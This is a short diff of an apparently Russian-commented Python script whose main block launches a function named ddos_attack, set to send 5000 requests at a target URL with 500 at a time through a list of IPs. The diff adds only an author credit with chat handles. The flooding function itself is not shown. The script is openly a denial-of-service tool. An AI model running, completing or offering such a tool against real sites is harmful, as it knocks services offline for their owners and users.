@@ -1,3 +1,4 @@
+#create by diablo ds:dsnu tg:@oxexecov
 import asyncio
 import aiohttp
 import random
@@ -51,3 +52,4 @@ if __name__ == "__main__":
     concurrency_level = 500  # Количество параллельных запросов
     total_requests_count = 5000  # Общее количество запросов
     asyncio.run(ddos_attack(TARGET_URL, ip_list, concurrency=concurrency_level, total_requests=total_requests_count))
+
